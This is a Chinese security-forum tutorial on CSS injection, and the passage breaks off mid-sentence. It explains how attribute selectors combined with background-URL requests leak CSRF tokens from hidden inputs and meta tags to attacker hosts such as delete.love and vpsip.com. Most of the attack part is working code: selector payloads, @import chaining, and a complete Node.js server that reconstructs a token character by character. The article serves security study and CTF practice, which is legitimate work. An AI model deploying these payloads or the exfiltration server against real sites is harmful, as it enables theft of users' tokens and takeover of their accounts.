---
title: CSS安全：不需要XSS也可以得到你的token！
url: https://forum.butian.net/share/4557
source: 奇安信攻防社区
date: 2025-09-23
fetch_date: 2025-10-02T20:31:02.115741
---

# CSS安全：不需要XSS也可以得到你的token！

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### CSS安全：不需要XSS也可以得到你的token！

* [漏洞分析](https://forum.butian.net/topic/48)
* [CTF](https://forum.butian.net/topic/52)

之前我们看到了用HTML进行dom clobbering攻击，那么这次，我们来利用CSS进行Inject吧！

前言
==
之前我们看到了用HTML进行dom clobbering攻击，那么这次，我们来利用CSS进行Inject吧！
什么是CSS Injection
================
css注入其实就和前面的HTML进行dom clobbering一样，就是对css可控的情况下面，利用`style`标签来进行攻击，不需要用到js和html就可以做到一些事情，并且很多开发者并不会觉得css能进行injection，所以不管在sanitizer还是dompurify，还是什么其他自己写的一些限制，都不会对style进行什么限制，所以还是有危害在的，跟随我的脚步，猛攻！
利用CSS进行leak
===========
两个特性
----
第一个特性：CSS的属性选择器，可以利用选择器来猜解对应的数据进行leak，比如说`input[value^=D]`可以筛选开头为D的元素，其中`^`用来匹配开头`$`匹配结尾`\*`匹配内容。
第二个特性：CSS本质上会发送Request请求，当我们的background设定了一个url后，CSS就会发送请求。
综合以上这两个特点，我们可以很简单的就知道要如何利用，举个简单的例子
```css
input[value^=D]{
background: url(https://Delete.love?love=D)
}
```
当匹配到D为开头，那么CSS就会像我们的Server发送`love=D`的请求，那我们就知道了某个我们要leak的值的开头就是D。
好，既然我们知道了如何去得到我们要的值，那么我们现在只需要确定我们需要leak什么值，一般来说我们的攻击都是要扩大范围，如何从点到面，从面到体，那么从打点思路来讲，最好不过的就是一个admin后台，所以我们目标定为，leak admin token
hidden input
------------
大多数页面，我们用户的token都是被写到hidden里面的，那么我们前面的选择器就没办法直接选择到对应的元素，例如
```html
<form action="/action">
<input type="hidden" name="csrf-token" value="DeleteXSS">
<input name="username">
<input type="submit">
</form>
```
这个时候，我们如果用
```css
[input name="csrf-token"][value^=D]{
background:url(http://delete.love?love=D)
}
```
是取不到的，这里我还是实操一下，不然说服性不强
![Pasted image 20250830025823.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/08/attach-7b48c50bddba7d41ccadb1580f45ccbcb3f1577b.png)
然后打开页面后
![Pasted image 20250830025959.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/08/attach-5dd4d2101d828d37aa41bffcafc0770d19b10d30.png)
可以看到正常写的可以发送请求，但是我们尝试换成hidden
![Pasted image 20250830030251.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/08/attach-e7dae2cd4fd75e19c94d94a3b3465d9f0502c19b.png)
可以看到请求并不会发过来，因为他并不会显示，对应他的background就没必要request，所以会发生这种情况，如何解决？
- 第一种情况：当我们leak的值后面有别的标签在我们可以让后面的标签进行background的request即可
```css
input[name="csrf-token"][value^="D"] + input {
background: url(https://example.com?q=a)
}
```
后面的`+input`取到的就是下一个元素，
![Pasted image 20250830030700.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/08/attach-3d6a7c608d9b7d89a7d58cf7ee38a8ccf450f9ef.png)
- 第二种情况：那如果我们要leak的值在最后面，没有标签了怎么办？这个时候我们可以看到这里[caniuse](https://caniuse.com/css-has) 我们可以利用has的选择器直接抓取，像这样
![Pasted image 20250830031053.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/08/attach-610667d3837eccc62c606302a51ea71b8c2206a2.png)
我们就可以随便抓到我们要的值了（有人应该发现了换值了因为怕是用到前面的方法请求得到的，嗯！严谨一点）
meta
----
同上面一样，可以设置为：`<meta name="csrf-token" content="abc123">`，并且这里也可以利用has去得到token
```css
html:has(meta[name="csrf-token"][content^="a"]) {
background: url(https://example.com?q=a);
}
```
然后另外一个方法是，虽然meta和hidden都是不可见的，但是通过css我们可以控制meta为可见，再利用前面的方法即可。
```css
head, meta {
display: block;
}
meta[name="csrf-token"][content^="a"] {
background: url(https://example.com?q=a);
}
```
这里记得也要把head也一起设置了因为head标签预设display:none
![Pasted image 20250830144042.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/08/attach-6ed8702c9d2a214d7dc40acc03bbf97eac53590b.png)
Question
========
对于以上的一些手法，不少人也许会提出疑问，csrf-token可能会动态更新，我们如何一次性拿到所有的字符串？难道只能一个一个去leak吗，当token很长的时候，是不是需要很长时间？又或者是我们有没有其他可以leak的东西？那么接下来，我们来研究这些东西
一次性拿到你需要的数据
===========
关于这个问题，我们可以看一下这份报告：[CSS Injection Attacks](https://vwzq.net/slides/2019-s3\_css\_injection\_attacks.pdf)
![Pasted image 20250830145923.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/08/attach-d43cad25289c5f2fea8c74f523b1c611254f1ca8.png)
Pepe Vila指出可以利用@import来引入style，具体的思路就是，在你的server端写下类似这样子的css文件
```css
@import url(https://vpsip.com/payload?len=1)
@import url(https://vpsip.com/payload?len=2)
@import url(https://vpsip.com/payload?len=3)
@import url(https://vpsip.com/payload?len=4)
@import url(https://vpsip.com/payload?len=5)
@import url(https://vpsip.com/payload?len=6)
@import url(https://vpsip.com/payload?len=7)
@import url(https://vpsip.com/payload?len=8)
```
然后只需要在攻击的时候import一个
```css
@import url(https://vpsip.com/start?len=8)
```
server端就会一个个去leak对应的值，并且这个样子就不需要重新加载新的东西，所以也不用担心刷新后某个值会变了。
现在举个例子。
```css
<!doctype html>
<body>
<div><article><div><p><div><div><div><div><div>
<input type="text" value="Deletefvv">
<style>
@import url('//vpsip:7777/start?');
</style>
```
脚本
```node
const http = require('http');
const url = require('url');
const port = 5001;
const HOSTNAME = "http://localhost:5001";
const DEBUG = false;
var prefix = "", postfix = "";
var pending = [];
var stop = false, ready = 0, n = 0;
const requestHandler = (request, response) => {
let req = url.parse(request.url, url);
log('\treq: %s', request.url);
if (stop) return response.end();
switch (req.pathname) {
case "/start":
genResponse(response);
break;
case "/leak":
response.end();
if (req.query.pre && prefix !== req.query.pre) {
prefix = req.query.pre;
} else if (req.query.post && postfix !== req.query.post) {
postfix = req.query.post;
} else {
break;
}
if (ready == 2) {
genResponse(pending.shift());
ready = 0;
} else {
ready++;
log('\tleak: waiting others...');
}
break;
case "/next":
if (ready == 2) {
genResponse(respose);
ready = 0;
} else {
pending.push(response);
ready++;
log('\tquery: waiting others...');
}
break;
case "/end":
stop = true;
console.log('[+] END: %s', req.query.token);
default:
response.end();
}
}
const genResponse = (response) => {
console.log('...pre-payoad: ' + prefix);
console.log('...post-payoad: ' + postfix);
let css = '@import url('+ HOSTNAME + '/next?' + Math.random() + ');' +
[0,1,2,3,4,5,6,7,8,9,'a','b','c','d','e','f'].map(e => ('input[value$="' + e + postfix + '"]{--e'+n+':url(' + HOSTNAME + '/leak?post=' + e + postfix + ')}')).join('') +
'div '.repeat(n) + 'input{background:var(--e'+n+')}' +
[0,1,2,3,4,5,6,7,8,9,'a','b','c','d','e','f'].map(e => ('input[value^="' + prefix + e + '"]{--s'+n+':url(' + HOSTNAME + '/leak?pre=' + prefix + e +')}')).join('') +
'div '.repeat(n) + 'input{border-image:var(--s'+n+')}' +
'input[value='+ prefix + postfix + ']{list-style:url(' + HOSTNAME + '/end?token=' + prefix + postfix + '&)};';
response.writeHead(200, { 'Content-Type': 'text/css'});
response.write(css);
response.end();
n++;
}
const server = http.createServer(requestHandler)
server.listen(port, (err) => {
if (err) {
return console.log('[-] Error: something bad happened', err);
}
console.log('[+] Server is listening on %d', port);
})
function log() {
if (DEBUG) console.log.apply(console, arguments);
}
```
其实就是不断leak，思路是和上面是一致的
![Pasted image 20250830170305.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/08/attach-e6b9f3f086002a7d44277f9994da4718895caefb.png)
可以看出来leak出来了。
所以只要用`@import`这个CSS 的功能，就可以做到「不重新载入页面，但可以动态载入新的style」，进而偷取后面的每一个字符。
那么对于leak速度的问题，我们可以取双向爆破的方法，也就是，一个从`^`开始一个从`$`开始，从而将效率翻倍，但是这里要记住一个点就是，要用到不同的属性，一个用background，另一个要用border-background，不然会冲突只发出一个request，像这样
```css
input[name="secret"][value^="a"] {
background: url(https://b.myserver.com/leak?q=a)
}
input[name="secret"][value^="b"] {
background: url(https://b.myserver.com/leak?q=b)
}
// ...
input[name="secret"][value$="a"] {
border-background: url(https://b.myserver2.com/suffix?q=a)
}
input[name="secret"][value$="b"] {
border-background: url(https://b.myserver2.com/suffix?q=b)
}
```
leak其他的数据
=========
除了可以拿到标签里面的数据，我们能否取到别的数据？比如script的程序？又或者是页面上的内容。
unicode-range
-------------
在CSS 里面，有一个属性叫做「unicode-range」，可以针对不同的字元，载入不同的字体。
举一个例子M...